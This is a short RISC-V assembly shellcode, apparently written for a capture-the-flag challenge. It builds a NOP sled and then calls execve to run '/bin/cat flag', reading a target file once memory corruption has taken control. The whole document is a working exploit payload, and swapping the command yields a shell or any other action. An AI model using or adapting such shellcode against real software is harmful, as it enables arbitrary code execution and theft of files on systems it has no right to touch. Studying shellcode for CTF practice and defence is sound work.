    .global _start
    .text
_start:
    .fill 488, 2, 0x0101         # nops
    addi sp, sp, 24              # allocate stack

    jal s1, skip1                # put strings on stack
    .ascii "/bin/cat\0\0"
skip1:
    sd s1, 0(sp) 
    jal s1, skip2
    .ascii "flag\0\0"
skip2:
    sd s1, 8(sp)

    c.li s1, 0                  # terminate argv array
    sd s1, 16(sp)

    ld a0, 0(sp)                # a0 = filename
    mv a1, sp                   # a1 = argv
    c.li a2, 0                  # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall
